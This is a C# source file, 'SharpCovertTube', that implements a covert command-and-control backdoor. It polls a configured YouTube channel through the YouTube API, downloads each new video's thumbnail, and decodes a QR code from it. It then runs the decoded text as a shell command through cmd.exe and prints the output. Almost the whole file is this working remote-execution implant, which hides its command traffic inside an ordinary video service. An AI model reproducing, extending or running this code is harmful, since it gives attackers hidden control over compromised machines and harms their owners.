using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using ZXing;

namespace SharpCovertTube
{
    internal class Program
    {
        static string getRequest(string url) {
            WebRequest wrGETURL = WebRequest.Create(url);
            Stream objStream = wrGETURL.GetResponse().GetResponseStream();
            StreamReader objReader = new StreamReader(objStream);
            string json_response_str = "";
            string sLine = "";

            while (sLine != null)
            {
                json_response_str += sLine;
                sLine = objReader.ReadLine();
            }

            return json_response_str;
        }

        static List<string> GetVideoIds(string channel_url)
        {
            List<string> VideoIds = new List<string>();
            string json_response_str = getRequest(channel_url);

            var deserialized = JSONSerializer<APIInfo>.DeSerialize(json_response_str);
            foreach (Item item in deserialized.items)
            {
                // Console.WriteLine("[+] VideoId: \t{0}", item.id.videoId);
                VideoIds.Add(item.id.videoId);
            }

            return VideoIds;
        }


        static void MonitorChannel(string channel_url, int seconds_delay) {
            // Initial videos
            List<string> Initial_VideoIds = GetVideoIds(channel_url);
            int number_of_videos = Initial_VideoIds.Count;
            foreach (string value in Initial_VideoIds)
            {
                Console.WriteLine("[+] ID: \t{0}", value);
            }

            while (true)
            {
                // Sleep
                Console.WriteLine("[+] Sleeping {0} seconds \n", seconds_delay);
                System.Threading.Thread.Sleep(1000 * seconds_delay);

                // Get list of videos
                List<string> VideoIds = GetVideoIds(channel_url);
                // New videos
                if (VideoIds.Count > number_of_videos)
                {
                    Console.WriteLine("[+] New videos uploaded!");

                    var firstNotSecond = VideoIds.Except(Initial_VideoIds);
                    foreach (var video_id in firstNotSecond)
                    {
                        Console.WriteLine("[+] New ID: \t{0}", video_id);
                        DownloadVideo(video_id, channel_url);
                    }

                    number_of_videos = VideoIds.Count;
                    Initial_VideoIds = VideoIds;
                }
                // No new videos
                else
                {
                    Console.WriteLine("[+] No new videos... Total: {0}", VideoIds.Count);
                }
            }
        }


        public static string RandomString(int length)
        {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
            Random random = new Random();
            return new string(Enumerable.Repeat(chars, length)
                .Select(s => s[random.Next(s.Length)]).ToArray());
        }


        static string ReadQR(string thumbnail_url) {
            var client = new WebClient();
            var stream = client.OpenRead(thumbnail_url);
            if (stream == null) return "";
            var bitmap = new Bitmap(stream);
            IBarcodeReader reader = new BarcodeReader();
            var result = reader.Decode(bitmap);
            string decoded_cmd = result.Text;
            return decoded_cmd;
        }


        static string ExecuteCommand(string command) {
            string output = "";
            using (Process process = new Process())
            {
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = "/c " + command;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.Start();

                // Synchronously read the standard output of the spawned process.
                StreamReader reader2 = process.StandardOutput;
                output = reader2.ReadToEnd();

                process.WaitForExit();
            }
            return output;
        }


        static void DownloadVideo(string video_id, string channel_url) {
            /*
            // Check for new thumbnails
            string json_response_str = getRequest(channel_url);

            var deserialized = JSONSerializer<APIInfo>.DeSerialize(json_response_str);
            foreach (Item item in deserialized.items)
            {
                Console.WriteLine("[+] VideoId: \t{0}", item.id.videoId);
                Console.WriteLine("[+] Thumbnail: \t{0}", item.snippet.thumbnails.high.url);
                if (item.id.videoId == video_id) {
                    string thumbnail = item.snippet.thumbnails.high.url;
                    Console.WriteLine("[+] Downloading {0} from {1}", video_id, thumbnail);
                    DownloadThumbnail(thumbnail);
                }
            }
            */

            /*
            // Download QR code from thumbnail
            using (WebClient client = new WebClient())
            {
                string rand_name = @"c:\windows\temp\" + RandomString(10) + ".jpg";
                Console.WriteLine("[+] Downloading {0} to path {1}", thumbnail_url, rand_name);
                client.DownloadFile(new Uri(thumbnail_url), rand_name);
            }
            */

            Console.WriteLine("[+] Reading video with ID {0}", video_id);
            string thumbnail_url = "https://i.ytimg.com/vi/" + video_id + "/hqdefault.jpg";
            // Read QR
            string decoded_cmd = ReadQR(thumbnail_url);
            Console.WriteLine("[+] Value decoded from QR:\t{0}", decoded_cmd);
            // Execute command
            string response_cmd = ExecuteCommand(decoded_cmd);
            Console.WriteLine("[+] Response from command:\t{0}", response_cmd);
        }


        static void Main(string[] args)
        {
            // FILL VALUES
            string channel_id = "";
            string api_key = "";
            int seconds_delay = 60;

            string base_search_url = "https://www.googleapis.com/youtube/v3/search?";
            string channel_url = base_search_url + "part=snippet&channelId=" + channel_id + "&maxResults=100&order=date&type=video&key=" + api_key;
            Console.WriteLine("[+] URL to test for file upload: {0}", channel_url);

            MonitorChannel(channel_url, seconds_delay);
        }
    }
}
